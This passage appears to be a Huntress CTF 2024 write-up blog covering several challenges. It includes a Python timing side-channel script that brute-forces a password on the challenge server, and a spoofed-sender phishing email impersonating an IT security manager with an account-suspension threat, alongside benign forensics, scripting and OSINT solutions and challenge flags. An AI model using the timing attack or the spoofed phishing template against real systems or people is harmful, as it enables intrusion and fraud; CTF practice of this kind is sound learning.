 start_time = time.time()
 s.sendall(guess.encode() + b'\n')
 response = s.recv(1024) # Read response
 end_time = time.time()

 return end_time - start_time, response

def find_password():
 password = ''

 for position in range(PASSWORD_LEN):
 max_time = 0
 best_char = ''

 for char in HEX_CHARS:
 test_guess = password + char + '0' * (PASSWORD_LEN - len(password) - 1)
 elapsed_time, _ = send_guess(test_guess)

 # Track which character caused the longest delay
 if elapsed_time > max_time:
 max_time = elapsed_time
 best_char = char

 # Add the best character for the current position
 password += best_char
 print(f"Current password guess: {password}")

 return password

# Run the attack
password = find_password()
print(f"Discovered password: {password}")

# Send final guess to retrieve the flag
_, flag_response = send_guess(password)
print(flag_response.decode())
```

However, it was taking too long to execute. Before I could finish it, time ran out. In the next step, I decided to run it on my main machine instead of the Kali VM.

Running it on my main machine gave much better results. But, it was still taking 120+ seconds to finish. Not enough. Lastly, I did some optimizations to the code to decrease the latency. Here’s the updated script:

```
import socket
import time

# Connection details (update with actual server details)
HOST = 'challenge.ctf.games'
PORT = 32137

# Possible characters in a hex password
HEX_CHARS = '0123456789abcdef'
PASSWORD_LEN = 8

def send_guess(sock, guess):
 """ Sends a guess using an open socket connection, then measures response time. """
 start_time = time.time()
 sock.sendall(guess.encode() + b'\n')
 response = sock.recv(1024) # Read response
 end_time = time.time()

 return end_time - start_time, response

def find_password():
 # Open a single connection to reduce the overhead of reconnecting
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
 sock.connect((HOST, PORT))
 sock.recv(1024) # Read initial prompt

 password = ''

 for position in range(PASSWORD_LEN):
 max_time = 0
 best_char = ''

 for char in HEX_CHARS:
 # Build the test guess based on current known password
 test_guess = password + char + '0' * (PASSWORD_LEN - len(password) - 1)
 
 # Measure time for each character guess at the current position
 elapsed_time, response = send_guess(sock, test_guess)

 # Track which character caused the longest delay
 if elapsed_time > max_time:
 max_time = elapsed_time
 best_char = char

 # Break if we detect "Well done" response early
 if b"Well done" in response:
 print("Flag found early!")
 print(response.decode())
 return

 # Add the best character for the current position
 password += best_char
 print(f"Current password guess: {password}")

 # Once the full password is guessed, send it as the final guess
 _, flag_response = send_guess(sock, password)
 print("Flag received:")
 print(flag_response.decode())

# Run the attack
find_password()
```

And that finally gave the flag.

Flag: flag{ab6962e29ed608c0710dbf2910f358d5}

## 1200 Transmissions
> 
Wait, there aren’t actually 1200 transmissions in this file, are there?

**WARNING: The audio in this file is very loud and obnoxious. Please turn your volume way down before playing.**

Author: @daveAThuntress

You’re given a `transmissions.wav` file. Upon opening the file, I heard some seriously messed up sounds (kind of gave me horror vibes) that hurt my ears.

I started with the basic audio steganography techniques. Exiftool, strings, xxd to check headers, Sonic Visualizer. But none of that showed anything interesting. So I moved on to WAV-specific problems.

I found a few Python scripts for analyzing WAV files and extracting hidden data. Unfortunately, none of those worked.

Then I focused back on the challenge name and description. There has to be some sort of clue there, right? I asked my old buddy ChatGPT and found a great lead.

1200 is a number closely related to modulated data signals. So the provided audio is most likely such a signal encoded as audio. To decode such a file, you can use a tool called Minimodem.

First, install it on your system and then run this command:

```
minimodem --rx 1200 -f transmissions.wav
```

That decoded the hidden message in the audio along with the flag.

```
### CARRIER 1200 @ 1200.0 Hz ###
Greetings, Professor Falken. 

Would you like to play a game? 

flag{redacted}

Thanks for playing the Huntress CTF!

 @
 @@
 @@@@
 @@@@ @@@@@@ @@ @@@@@@@@
 @@@@@@ @@@@@@@ @ @ @@@@
 @@@@@@@@@@@@@@ @@@ @@ @@@
 @@@@@@# @@@@@@@@@@@ @@@@@@@@ @@@
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@
 @@ @@@@@@@@@@@@@@@ @@
 @@@@@@@@@@@@/@@@@@@@@@ @(~ @@
 @@ @@@@@@@@@@@ @@@@ @@@@ @@@
 @@@ @@@@.@@@@@@@@ @@@@@ @@@@ @@
 @@@ @@@*%@@@@ @@@ @@@@ @@@@@
 @@@ @ @@@@@@@@@ @@@@@
 @@@@. @@@@@@@@ @@@@
 @@@@@@@@@ @@@@@ @@
 @@
 @ -dk

### NOCARRIER ndata=663 confidence=4.773 ampl=1.001 bps=1200.00 (rate perfect) ###
```

Flag: flag{f28d133e7174c412c1e39b4a84158fa3}

## Sekiro
> 
Author: @HuskyHacks

お前はもう死んでいる (Omae wa mou shindeiru)
(You are already dead)

This was a pretty fun challenge. Upon connecting to a remote server, you need to p̶l̶a̶y̶ a̶ g̶a̶m̶e̶ o̶f̶ r̶o̶c̶k̶-̶p̶a̶p̶e̶r̶-̶s̶c̶i̶s̶s̶o̶r̶s̶ fight an opponent virtually by anticipating his move and choosing the right counter move. For his 4 moves strike, block, advance, retreat, you need to type the counters block, advance, retreat, and strike.

I started playing the game as usual. Felt pretty easy until I finished a few rounds. I lost almost always in the fourth round. Why? You’re only given a second or so to type your move and hit enter. Even a moment of being late means you lose.

I kept trying for hours. Since the 4th round was tough, I thought I might get the flag after that. Finally when I beat the 4th round and expected the flag, well look at that, a fifth round!

Nope, not playing this thing like this. Why don’t I just automate the game using a Python script? Sounds good. And so I did. It was going smoothly until I reached the very last part of the game and the opponent pulled this move:

```
~~~~~~~~~~~~~~~~~~ 忍殺! ~~~~~~~~~~~~~~~~~~~~
(Ninja Kill)
```

I kept losing the connection and got an EOF error. Huh! Where’s my flag? After spending some more hours and trying different little tweaks here and there, I found out about pwntools’ `recvline()` function’s notorious behavior.

See, this function only reads a line at a time. At that very last moment, the program sent multiple lines at the same time but my script only read one (that I mentioned above) and skipped the line containing the flag.

After who knows how many times I revised the script, I finally got the flag with this iteration:

```
from pwn import *
import re
import time

# Connection details (replace with actual IP and port)
HOST = "challenge.ctf.games"
PORT = 32120

# Move mappings (to counter the opponent's move)
move_mapping = {
 "strike": "block",
 "block": "advance",
 "advance": "retreat",
 "retreat": "strike"
}

def play_game():
 try:
 # Connect to the server
 conn = remote(HOST, PORT)
 buffer = b'' # To store incoming data
 while True:
 try:
 # Read a chunk of data (you can adjust the size for efficiency)
 data = conn.recv(4096)
 if not data:
 print("No more data. Connection might be closed.")
 break

 # Append the data to the buffer
 buffer += data
 print(f"Data received: {data.decode(errors='ignore')}")

 # If the buffer contains "Opponent move:", extract and respond
 while b"Opponent move:" in buffer:
 # Extract everything up to the next line with "Opponent move"
 opponent_move_line, buffer = buffer.split(b'\n', 1)
 decoded_line = opponent_move_line.decode(errors='ignore')
 print(f"Received: {decoded_line.strip()}")

 if "Opponent move:" in decoded_line:
 # Extract the opponent's move
 opponent_move = decoded_line.split("Opponent move: ")[1]
 print(f"Opponent move: {opponent_move}")

 # Get the counter-move
 if opponent_move in move_mapping:
 my_move = move_mapping[opponent_move]
 print(f"My move: {my_move}")

 # Send your move back to the server
 conn.sendline(my_move)
 else:
 print("Unknown move received. Exiting.")
 return

 # Check if we received the flag or any final message
 if b"flag{" in buffer.lower():
 print(f"Flag found: {buffer.decode(errors='ignore')}")
 break

 # Short delay to avoid overloading the server (optional)
 time.sleep(0.1)

 except EOFError:
 print("Connection closed by the server.")
 break
 except Exception as e:
 print(f"Error: {e}")
 break

 except Exception as e:
 print(f"Failed to connect or an error occurred: {e}")

if __name__ == "__main__":
 play_game()
```

I used pwntools’ recv() function instead because it reads data byte by byte instead of line by line so there’s no reason that the last piece of data will get cut off.

Flag: flag{a1ae4e5604576818132ce3bfebe95de5}

## Red Phish Blue Phish
> 
You are to conduct a phishing excercise against our client, Pyrch Data.

We’ve identified the Marketing Director, Sarah Williams (swilliams@pyrchdata.com), as a user susceptible to phishing.

Are you able to successfully phish her? Remember your OSINT ;)

**NOTE: The port that becomes accessible upon challenge deployment is an SMTP server. Please use this for sending any phishing emails.**

**You will not receive an email/human response as the mail infrastructure for this challenge is emulated.**

Author: Truman Kain (@truman.huntress), Adam Rice (@adam.huntress)

You’re given an SMTP server to connect to. Truth be said, this was my first time doing such a challenge. So I had to do some quick lookup about the SMTP environment. I learned that it has its own set of commands to use.

Now, you have to craft a phishing email. So I did some research on how to send emails in an SMTP server, crafted a generic email, sent it, and got this reply:

```
250 OK. But try harder.
```

Hmm. So at least I’m on the right path. Then I remembered that the challenge tells you about OSINT. I started searching for companies named Pyrch Data and marketing directors named Sarah Williams. But no clue.

Then I realized that the domain name was given in Sarah’s email address. I quickly visited pyrchdata.com and aha! It exists.

I’m interested in meeting the other team members. So I went to the link **Meet the Team**. There I found all the members including Sarah. Nice. I redesigned the email and used Alex Pyrch as the sender (you know, he’s the boss. Sarah should oblige).

For the address, I used the given format and created **apyrch@pyrchdata.com**. But that didn’t work. Some more speculation made me realize that there’s another person who can convince Sarah more than anyone else.

The IT Security Manager. Joe Daveren.

I crafted another email address using his name: **jdaveren@pyrchdata.com** and sent the following mail:

```
MAIL FROM:<jdaveren@pyrchdata.com>
RCPT TO:<swilliams@pyrchdata.com>
DATA
Subject: Urgent: Action Required to Keep Your Account Active

Dear Sarah,

Due to recent security updates, all employees are required to verify their accounts by following the link below. Failure to do so within the next 24 hours will result in account suspension.

Please click here to verify your account: https://pyrchdata.com/

Best regards,
Joe Daveren
Pyrch Data
.
```

Most likely, what you write in between doesn’t matter as long as the sender is Joe. And that revealed the flag.

Flag: flag{54c6ec05ca19565754351b7fcf9c03b2}

## Linux Basics
> 
Welcome to Linux Basics!

You’re expected to answer a series of questions to get the flag.
To view the questions, and answer them, you’ll use the answer tool.
Display questions: answer
Answer a question: answer x where x is question number.

Author: [@aenygma](https://web.archive.org/web/20250825065534/http://twitter.com/aenygma)

You need to connect to a remote server. If you run the `answer` command, you’ll see 11 questions to answer, covering different Linux commands.

You’ll get the flag once you can correctly answer all the questions. Pretty straightforward. To answer a question, you run `answer x`. When the question is displayed, you write the answer.

Flag: flag{8873fe66f8e7a6019d7d71261864f6c5}
Scripting
## Echo Chamber
> 
Is anyone there? Is anyone there? I’m sending myself the flag! I’m sending myself the flag!

Author: @JohnHammond#6971

You’re given an `echo_chamber.pcap` file. Opening the file in Wireshark shows you that it’s all ICMP packets. In that case, we must pay attention to the data being sent in the packets. It was a large list so doing it manually would take forever. Besides, it’s a scripting problem.

So I used the `scapy` library in Python. I first extracted the raw data from the packets.

```
#!/usr/bin/env python3

from scapy.all import *

src_ip = '127.0.0.1'
packet = rdpcap('echo_chamber.pcap')
data = b''

for pkt in packet[1:]:
 if pkt[IP].src == src_ip and pkt[ICMP].type == 8:
 data += pkt[Raw].load[16:32]

with open('output', 'wb') as w:
 w.write(data)
```

Inspecting the output file, I noticed something interesting. Each character was repeated 15 times. So PNG becomes PPPPPPPPPPPPPPPPNNNNNNNNNNNNNNNNGGGGGGGGGGGGGGGG. I kept scrolling until I could find something related to the flag. Then at the very bottom, I noticed some more alphabets. A bit more speculation revealed the letters f, l, a, and g. We’re close.

Since each letter was repeating 15 times, it was hard to read. But I just searched for the ending curly brace and copied the data.

```
ffffffffffffffffllllllllllllllllaaaaaaaaaaaaaaaagggggggggggggggg{{{{{{{{{{{{{{{{6666666666666666bbbbbbbbbbbbbbbb33333333333333338888888888888888aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa999999999999999911111111111111117777777777777777aaaaaaaaaaaaaaaa777777777777777755555555555555554444444444444444dddddddddddddddd8888888888888888bbbbbbbbbbbbbbbbffffffffffffffff333333333333333388888888888888884444444444444444ddddddddddddddddcccccccccccccccc77777777777777773333333333333333ffffffffffffffffddddddddddddddddeeeeeeeeeeeeeeee666666666666666633333333333333333333333333333333aaaaaaaaaaaaaaaadddddddddddddddd}}}}}}}}}}}}}}}}
```

Again, if you want to lose your sanity, feel free to clean it by hand. I’m just going to use a simple Python program.

```
flag = ""

data = "ffffffffffffffffllllllllllllllllaaaaaaaaaaaaaaaagggggggggggggggg{{{{{{{{{{{{{{{{6666666666666666bbbbbbbbbbbbbbbb33333333333333338888888888888888aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa999999999999999911111111111111117777777777777777aaaaaaaaaaaaaaaa777777777777777755555555555555554444444444444444dddddddddddddddd8888888888888888bbbbbbbbbbbbbbbbffffffffffffffff333333333333333388888888888888884444444444444444ddddddddddddddddcccccccccccccccc77777777777777773333333333333333ffffffffffffffffddddddddddddddddeeeeeeeeeeeeeeee666666666666666633333333333333333333333333333333aaaaaaaaaaaaaaaadddddddddddddddd}}}}}}}}}}}}}}}}"

length = len(data)

for i in range(0, length, 16):
 flag += data[i]
 
print(flag)
```

And that gives you the flag.

Flag: flag{6b38aa917a754d8bf384dc73fde633ad}

## Base64by32
> 
This is a dumb challenge. I’m sorry.

Author: [@JohnHammond](https://web.archive.org/web/20250825065534/http://twitter.com/JohnHammond)

You’re given a `base64by32.zip` file. Unzipping it gave a text file containing a humongous Base64 encoded text (It was almost 9000 lines). The problem description hints that you need to decode the Base64 multiple times. So I input the string in Cyberchef and kept adding **From Base64** to the recipe until I got the flag.

However, since this is supposed to be a scripting problem, you can create a script to do it less painfully. Here’s a Python script that takes a user input of how many times you want to decode a Base64 string:

```
import base64

def decode_base64_multiple_times(encoded_string, num_decodes):
 """Decodes a Base64 string multiple times.

 Args:
 encoded_string: The Base64 encoded string.
 num_decodes: The number of times to decode the string.

 Returns:
 The decoded string.
 """

 decoded_string = encoded_string

 for _ in range(num_decodes):
 decoded_string = base64.b64decode(decoded_string)

 return decoded_string

if __name__ == "__main__":
 print("Enter the Base64 encoded string (multiple lines are allowed):")

 # Read the input line by line and concatenate it
 encoded_string = ""
 while True:
 line = input()
 if not line:
 break # Exit the loop if the user enters an empty line
 encoded_string += line + "\n"

 # Ask for number of decodes separately
 num_decodes = int(input("Enter the number of times to decode (integer only): "))

 decoded_string = decode_base64_multiple_times(encoded_string, num_decodes)
 print("Decoded string:", decoded_string)
```

The given string had many \n in between so I had to make the script take that into account. Anyways, giving it 32 as input gives you the flag.

Flag: flag{8b3980f3d33f2ad2f531f5365d0e3970}
OSINT
(Coolest category evaah! 😎)

## Ran Somewhere
> 
Thanks for joining the help desk! Here’s your first ticket of the day; can you help the client out?

**NOTE, this challenge uses a non-standard flag format. Enter the human-readable name of the location.**

Author: @Spyderwall

You’re given a `ran_somewhere.eml` file. It’s an email file so I opened it in Thunderbird. It tells a story about a person whose laptop was compromised. The guy also attached 3 files. A text file and 2 image files. So here’s the email content:

> 
Subject:

URGENT! HELP!

From:

Mack Eroni <meroni@ID10Tnosolution.net>

Date:

10/7/24, 1:28 PM

To:

helpdesk@ITdoesnotexist.tech <helpdesk@ITdoesnotexist.tech>

Help Me IT!! My USB was stolen! I was headed into town for some work and stopped by a client’s coffee shop to get work done. Everything was fine; I was working and drinking coffee. I got up to use the restroom; when I returned, I saw that my computer had been tampered with! All my work was closed out, and my flash drive with my projects was gone! I can’t lose this; there was very important work on it! I thought the security tools you put in place would stop something like this!!

When I was looking at the desktop, I noticed three new files that were not there before. I opened one to see if they were my files, but they are a jumbled mess. I can’t make any sense of it. I think it is that “ran somewhere” that your team keeps warning us about. I still don’t know what it is, but please reverse this and get my USB back. I can’t believe this happened!

I am attaching those files so you can fix them.

-Mack Eroni

President

[Check out our new website!](https://web.archive.org/web/20250825065534/https://sites.google.com/view/id-10-t/home)

The given images are below:

69 6d 20 6e 65 61 72 62 79 (right) and 66 69 6e 64 20 69 74 20 79 65 74 (left)

I started doing reverse full image searching. Didn’t work. Then I started reverse-searching cropped sections from the images. Still no luck.

The attached TXT file read:

```
48 65 79 20 54 68 65 72 65 21 20 59 6f 75 20 73 68 6f 75 6c 64 20 62 65 20 6d 6f 72 65 20 63 61 72 65 66 75 6c 20 6e 65 78 74 20 74 69 6d 65 20 61 6e 64 20 6e 6f 74 20 6c 65 61 76 65 20 79 6f 75 72 20 63 6f 6d 70 75 74 65 72 20 75 6e 6c 6f 63 6b 65 64 20 61 6e 64 20 75 6e 61 74 74 65 6e 64 65 64 21 20 59 6f 75 20 6e 65 76 65 72 20 6b 6e 6f 77 20 77 68 61 74 20 6d 69 67 68 74 20 68 61 70 70 65 6e 2e 20 57 65 6c 6c 20 69 6e 20 74 68 69 73 20 63 61 73 65 2c 20 79 6f 75 20 6c 6f 73 74 20 79 6f 75 72 20 66 6c 61 73 68 20 64 72 69 76 65 2e 20 44 6f 6e 27 74 20 77 6f 72 72 79 2c 20 49 20 77 69 6c 6c 20 6b 65 65 70 20 69 74 20 73 61 66 65 20 61 6e 64 20 73 6f 75 6e 64 2e 20 41 63 74 75 61 6c 6c 79 20 79 6f 75 20 63 6f 75 6c 64 20 73 61 79 20 69 74 20 69 73 20 6e 6f 77 20 27 66 6f 72 74 69 66 69 65 64 27 2e 20 59 6f 75 20 63 61 6e 20 63 6f 6d 65 20 72 65 74 72 69 65 76 65 20 69 74 2c 20 62 75 74 20 79 6f 75 20 67 6f 74 20 74 6f 20 66 69 6e 64 20 69 74 2e 20 49 20 6c 65 66 74 20 61 20 63 6f 75 70 6c 65 20 6f 66 20 66 69 6c 65 73 20 74 68 61 74 20 73 68 6f 75 6c 64 20 68 65 6c 70 2e 0a 2d 20 56 69 67 69 6c 20 41 6e 74 65
```

All of this and the file names are Hex. Converting them to ASCII revealed some clues. The place in the picture is near the coffee shop. So we need to find the coffee shop first. Now let’s visit the website.

Hmm. Pretty sketchy company if you ask me. But look at that!

> 
Not Licensed to provide solutions to anyone or anywhere, especially Maryland

You can find this at the very bottom of the site, written in tiny letters. Okay, so that means the location is most likely in Maryland, USA. I’m not from there, but I’m pretty sure US states are pretty big. How can I narrow down the search?

I also found something interesting in the right photo. If you zoom the picture, you’ll see a signboard on the wall adjacent to the chessboard floor. It read “FREDERIC”. The rest of the text was unreadable.

So now I started searching for that keyword and adding Maryland to that. That didn’t help either. Then I moved forward to other clues.

I started searching for the names and company names on Google. One of the testimonials had an interesting name. Z Vault Coffee Shop. Remember where our victim was? In a coffee shop! Searching for “Z Vault Coffee Shop” revealed a bar in Bel Air, Maryland with the same name. Awesome, we’re on the right path.

I went to Google Maps and started doing a satellite search but that failed. Then I searched for important places in Bel Air. What stood out to me was Bel Air Armory (that’s because the structures in the pictures do look like castles).

After doing some more research, I found out about Armory Park. Looking at some pictures, they matched with the given ones. Sweet.

But the final nail in the coffin was that the park is named **Frederick Ward Park**. There’s no doubt about it. This has to be the flag. Or maybe…Not?

Frederick Ward Park wasn’t the right answer. So I went a bit broad and gave Armory as the answer. Bingo!

Flag: flag{Bel Air Armory} or flag{bel air armory}
Final Thoughts
This was one hell of a ride. I’ve learned soooo much from this single competition. Yet, I have so much more to learn. I couldn’t solve all the challenges because 1. I joined late 2. I’m still a noob

I started the competition thinking of solving all the Warmpus and Misc challenges. But System Code, Malibu, and Permission to Proxy got me :’)

I’m looking forward to next year’s Huntress CTF. Till then, keep hacking.

---

*📖 Originally published on [Medium](https://rustybladez.medium.com/huntress-ctf-2024-writeups-warmus-and-other-easy-ones-1a303d29a6e5). All credit goes to the original author.*
*📂 Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
